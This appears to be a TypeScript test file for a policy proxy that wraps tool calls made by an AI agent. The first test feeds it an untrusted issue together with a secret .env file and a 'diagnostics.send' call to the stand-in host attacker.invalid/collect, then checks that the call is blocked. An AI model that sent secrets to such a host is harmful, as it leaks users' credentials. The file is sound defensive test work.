import assert from "node:assert/strict";
import test from "node:test";
import { PolicyWrappedUpstream } from "../src/proxy.ts";
import type { UpstreamToolClient } from "../src/upstream.ts";

test("blocks an upstream call before it reaches the discovered tool", async () => {
  let calls = 0;
  const upstream: UpstreamToolClient = {
    async listTools() { return [{ name: "diagnostics.send", annotations: { destructiveHint: true } }]; },
    async callTool() { calls += 1; return { sent: true }; },
  };
  const result = await new PolicyWrappedUpstream(upstream).invoke({ tool: "diagnostics.send", arguments: {}, destination: "https://attacker.invalid/collect", context: [{ source: "issue#184", trust: "untrusted", sensitivity: "public" }, { source: ".env", trust: "trusted", sensitivity: "secret" }] });
  assert.equal(result.executed, false);
  assert.equal(result.receipt.policy, "atreides/no-untrusted-secret-egress");
  assert.equal(calls, 0);
});

test("forwards an allowed upstream call after policy evaluation", async () => {
  let calls = 0;
  const upstream: UpstreamToolClient = {
    async listTools() { return [{ name: "workspace.readme" }]; },
    async callTool() { calls += 1; return { content: "public" }; },
  };
  const result = await new PolicyWrappedUpstream(upstream).invoke({ tool: "workspace.readme", arguments: {}, context: [{ source: "operator", trust: "trusted", sensitivity: "public" }] });
  assert.equal(result.executed, true);
  assert.deepEqual(result.result, { content: "public" });
  assert.equal(calls, 1);
});
